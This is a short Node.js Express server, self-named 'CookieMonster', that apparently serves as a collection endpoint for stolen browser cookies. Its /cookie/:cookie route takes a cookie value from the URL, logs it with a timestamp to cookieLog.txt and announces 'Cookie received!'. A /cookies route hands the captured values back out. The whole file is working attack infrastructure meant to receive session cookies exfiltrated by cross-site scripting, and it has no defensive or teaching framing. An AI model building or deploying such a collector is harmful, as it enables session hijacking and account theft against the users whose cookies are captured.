const express = require('express');
const server = express();
const fs = require('fs');

const serverConsolePromtPrefix = "<CookieMonster ";
const serverConsolePromtPostfix = "> ";

server.use('/', express.static("public"))     
server.use(express.json()); 

let cookies = [];

//API START
server.get('/cookies', (req, res) => {
    const c = cookies.pop();
    res.json(c?c:"{}");
})

server.get('/cookie/:cookie',(req,res) => {
    cookies.push(req.params.cookie);
    writeToLog(getDateTime(new Date())+ " : " +req.params.cookie+"\r\n");
    res.send('ok');
})

//everything else
server.get('/*', (req, res) => {
  res.sendFile('/index.html');
})
//API END

const port = 5123;
server.listen(port, function() {
  print('Listening on port ' + port)
})

function writeToLog(str){
  fs.appendFile('cookieLog.txt', str, err => {
    if (err) throw err;
    print('*Nom nom* Cookie received!');
  });
}

function getDateTime(d){
  var today = d;
  var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
  var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
  return date+' '+time;
}

function print(str){
  console.log(
      serverConsolePromtPrefix + 
      getDateTime(new Date()) + 
      serverConsolePromtPostfix + 
      str
    );
}

